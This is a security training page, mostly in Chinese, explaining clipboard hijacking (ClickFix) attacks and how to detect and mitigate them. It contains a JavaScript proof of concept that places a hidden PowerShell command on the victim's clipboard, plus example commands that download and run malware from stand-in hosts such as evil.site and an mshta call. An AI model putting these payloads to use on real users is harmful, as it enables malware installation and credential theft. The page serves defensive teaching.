# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "永远不要粘贴你没有自己复制的内容。" – 虽然老旧但仍然有效的建议

## Overview

Clipboard hijacking – 也称为 *pastejacking* – 利用用户常常在不检查的情况下复制和粘贴命令的事实。一个恶意网页（或任何支持JavaScript的环境，如Electron或桌面应用程序）以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常通过精心设计的社会工程指令被鼓励按下 **Win + R**（运行对话框）、**Win + X**（快速访问/PowerShell），或打开终端并 *粘贴* 剪贴板内容，立即执行任意命令。

因为 **没有文件被下载，也没有附件被打开**，该技术绕过了大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此，该攻击在传播商品恶意软件家族（如NetSupport RAT、Latrodectus loader或Lumma Stealer）的网络钓鱼活动中非常流行。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
较早的攻击使用 `document.execCommand('copy')`，而较新的攻击依赖于异步 **Clipboard API** (`navigator.clipboard.writeText`)。

## ClickFix / ClearFake 流程

1. 用户访问一个拼写错误或被攻陷的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用一个 `unsecuredCopyToClipboard()` 辅助函数，静默地将一个 Base64 编码的 PowerShell 单行命令存储在剪贴板中。
3. HTML 指示告诉受害者：“按 **Win + R**，粘贴命令并按 Enter 以解决问题。”
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的压缩包（经典的 DLL 侧载）。
5. 加载程序解密额外阶段，注入 shellcode 并安装持久性（例如计划任务）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### 示例 NetSupport RAT 链接
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (合法的 Java WebStart) 在其目录中搜索 `msvcp140.dll`。
* 恶意 DLL 动态解析 API 使用 **GetProcAddress**，通过 **curl.exe** 下载两个二进制文件 (`data_3.bin`, `data_4.bin`)，使用滚动 XOR 密钥 `"https://google.com/"` 解密它们，注入最终的 shellcode 并将 **client32.exe** (NetSupport RAT) 解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript 下载器
3. 获取 MSI 有效载荷 → 在签名应用程序旁边放置 `libcef.dll` → DLL 侧载 → shellcode → Latrodectus。

### 通过 MSHTA 的 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 调用启动一个隐藏的 PowerShell 脚本，该脚本检索 `PartyContinued.exe`，提取 `Boat.pst` (CAB)，通过 `extrac32` 和文件连接重建 `AutoIt3.exe`，最后运行一个 `.a3x` 脚本，该脚本将浏览器凭据外泄到 `sumeriavgv.digital`。

## 检测与狩猎

蓝队可以结合剪贴板、进程创建和注册表遥测来定位粘贴劫持滥用：

* Windows 注册表：`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 保留 **Win + R** 命令的历史记录 – 查找不寻常的 Base64 / 混淆条目。
* 安全事件 ID **4688** (进程创建)，其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 中。
* 事件 ID **4663** 用于在可疑的 4688 事件之前创建的 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件。
* EDR 剪贴板传感器（如果存在） – 关联 `Clipboard Write` 紧接着一个新的 PowerShell 进程。

## 缓解措施

1. 浏览器强化 – 禁用剪贴板写入访问 (`dom.events.asyncClipboard.clipboardItem` 等) 或要求用户手势。
2. 安全意识 – 教用户 *输入* 敏感命令或先将其粘贴到文本编辑器中。
3. PowerShell 受限语言模式 / 执行策略 + 应用程序控制以阻止任意单行命令。
4. 网络控制 – 阻止对已知粘贴劫持和恶意软件 C2 域的出站请求。

## 相关技巧

* **Discord 邀请劫持** 通常在诱使用户进入恶意服务器后滥用相同的 ClickFix 方法：
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考文献

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
